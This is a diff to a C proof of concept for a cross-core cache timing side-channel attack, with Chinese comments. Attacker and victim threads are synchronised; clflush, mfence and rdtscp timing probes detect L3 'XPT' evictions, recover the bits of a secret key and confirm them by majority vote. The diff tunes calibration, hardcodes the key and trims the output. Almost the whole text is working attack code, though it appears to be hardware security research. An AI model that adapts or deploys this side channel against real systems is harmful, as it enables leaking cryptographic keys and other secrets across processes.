@@ -12,7 +12,7 @@
 #define DUMMY_SIZE 128
 
 #define NUM_ROUNDS 7
-#define CALIBRATE_SAMPLES 5
+#define CALIBRATE_SAMPLES 10
 
 static inline void clflush(volatile void *p) { asm volatile("clflush (%0)" :: "r"(p)); }
 static inline void mfence() { asm volatile("mfence" ::: "memory"); }
@@ -42,12 +42,12 @@ void flush_hardware_state(volatile char **dummy_pages) {
 }
 
 // ================= 多线程同步控制变量 =================
-// sync_state:
+// sync_state: 
 // 0 = 初始状态，等待攻击者 Train
 // 1 = 攻击者 Train 完毕，受害者执行 Access
 // 2 = 受害者 Access 完毕，攻击者执行 Probe
 // 3 = 测试结束，退出线程
-volatile int sync_state = 0;
+volatile int sync_state = 0; 
 volatile int shared_bit_val = 0;
 volatile char *shared_victim_base = NULL;
 
@@ -64,24 +64,24 @@ void* victim_thread_func(void* arg) {
         if (shared_bit_val) {
             volatile char *vp = shared_victim_base;
             // 增加循环次数，确保穿透 L1/L2，迫使 L3 XPT 触发驱逐
-            for (int repeat = 0; repeat < 10; repeat++) {
+            for (int repeat = 0; repeat < 10; repeat++) { 
                 clflush(vp); mfence();
                 volatile char junk = *vp; mfence();
                 // 稍微给硬件一点处理预取逻辑的时间
-                for (volatile int d = 0; d < 50; d++);
+                for (volatile int d = 0; d < 50; d++); 
             }
         }
 
-        sync_state = 2;
+        sync_state = 2; 
     }
     return NULL;
 }
 
 // ================= 攻击者探针 (运行在 Core 0) =================
-uint32_t probe_once_multi(int bit, uint8_t secret_key,
-                    volatile char **attacker_pages,
+uint32_t probe_once_multi(int bit, uint8_t secret_key, 
+                    volatile char **attacker_pages, 
                     volatile char **dummy_pages,
-                    int dry_run)
+                    int dry_run) 
 {
     // 在每位探测前清空一次干扰状态
     flush_hardware_state(dummy_pages);
@@ -92,7 +92,7 @@ uint32_t probe_once_multi(int bit, uint8_t secret_key,
 
     // 2. 唤醒受害者
     shared_bit_val = dry_run ? 0 : ((secret_key >> bit) & 1);
-    sync_state = 1;
+    sync_state = 1; 
 
     // 等待受害者执行完毕
     while (sync_state != 2) {
@@ -102,16 +102,16 @@ uint32_t probe_once_multi(int bit, uint8_t secret_key,
     // 3. Probe
     // 缩短这里的等待时间，甚至可以尝试去掉它，
     // 因为 XPT 的驱逐几乎是和受害者访存同步发生的
-    busy_wait(50);
-
+    busy_wait(50); 
+    
     clflush(attacker_pages[0]); mfence(); lfence();
-
+    
     uint64_t start = rdtscp();
     lfence();
     volatile char junk = *attacker_pages[0]; mfence();
     uint32_t lat = (uint32_t)(rdtscp() - start);
 
-    sync_state = 0;
+    sync_state = 0; 
     return lat;
 }
 
@@ -124,24 +124,16 @@ int main(int argc, char *argv[]) {
         use_fixed_threshold = 1;
     }
 
-
-    uint8_t secret_key = 0xef; // 目标密钥
-        if (argc > 1) {
-        // 假设 Python 把 secret_key 作为第一个参数传入
-        // ./two_core_test <secret_key_hex>
-        secret_key = (uint8_t)strtol(argv[1], NULL, 16);
-    }
-    printf("Target Key: 0x%02x\n\n", secret_key);
-
-    size_t mem_size = 4000 * PAGE_SIZE;
+    uint8_t secret_key = 0x96; 
+    size_t mem_size = 4000 * PAGE_SIZE; 
     char *buffer = (char *)aligned_alloc(PAGE_SIZE, mem_size);
     memset(buffer, 0x55, mem_size);
 
     volatile char *attacker_pages[XPT_SIZE];
     for (int i = 0; i < XPT_SIZE; i++) attacker_pages[i] = &buffer[i * PAGE_SIZE];
-
+    
     shared_victim_base = &buffer[1000 * PAGE_SIZE]; // 设置全局共享的受害者地址
-
+    
     volatile char *dummy_pages[DUMMY_SIZE];
     for (int i = 0; i < DUMMY_SIZE; i++) dummy_pages[i] = &buffer[(2000 + i) * PAGE_SIZE];
 
@@ -165,7 +157,7 @@ int main(int argc, char *argv[]) {
 
         qsort(cal_samples, CALIBRATE_SAMPLES, sizeof(uint32_t), compare_uint32);
         uint32_t fast_median = cal_samples[CALIBRATE_SAMPLES / 2];
-        threshold = fast_median + 30;
+        threshold = fast_median + 30; 
         printf("RESULT_THRESHOLD:%u\n", threshold);
     } else {
         printf("[*] Using Oracle Threshold: %u\n", threshold);
@@ -173,31 +165,19 @@ int main(int argc, char *argv[]) {
 
     // --- 第二步：多轮全扫描 ---
     for (int r = 0; r < NUM_ROUNDS; r++) {
-        uint32_t round_lats[KEY_BITS]; // 存储这一轮的所有延迟
-        
         printf("Round %02d: ", r + 1);
-        for (int b = KEY_BITS - 1; b >= 0; b--) {
-            // 只探测一次！
+        for (int b = KEY_BITS-1; b >= 0; b--) {
             uint32_t lat = probe_once_multi(b, secret_key, attacker_pages, dummy_pages, 0);
-            round_lats[b] = lat;
-
-            // 判定逻辑
+            
             int is_one = (lat > threshold) ? 1 : 0;
             vote_box[b] += is_one;
-            printf("%d(%u) ", is_one, lat);
-        }
-        printf("\n");
-
-        // 专门给 Python 脚本抓取的格式化输出
-        printf("LAT_DATA:");
-        for (int b = KEY_BITS - 1; b >= 0; b--) {
-            printf("%u%s", round_lats[b], (b == 0) ? "" : ",");
+            printf("%d(%u) ", is_one, lat); 
         }
         printf("\n");
     }
 
     // --- 结束受害者线程 ---
-    sync_state = 3;
+    sync_state = 3; 
     pthread_join(victim_tid, NULL);
 
     // --- 第三步：多数表决 ---
@@ -206,9 +186,9 @@ int main(int argc, char *argv[]) {
     for (int b = 0; b < KEY_BITS; b++) {
         int final_guess = (vote_box[b] > (NUM_ROUNDS / 2)) ? 1 : 0;
         if (final_guess) recovered |= (1 << b);
-
-        printf("Bit %d | Votes: %2d/%2d | Final: %d | %s\n",
-               b, vote_box[b], NUM_ROUNDS, final_guess,
+        
+        printf("Bit %d | Votes: %2d/%2d | Final: %d | %s\n", 
+               b, vote_box[b], NUM_ROUNDS, final_guess, 
                (final_guess == ((secret_key >> b) & 1) ? "OK" : "FAIL"));
     }
 
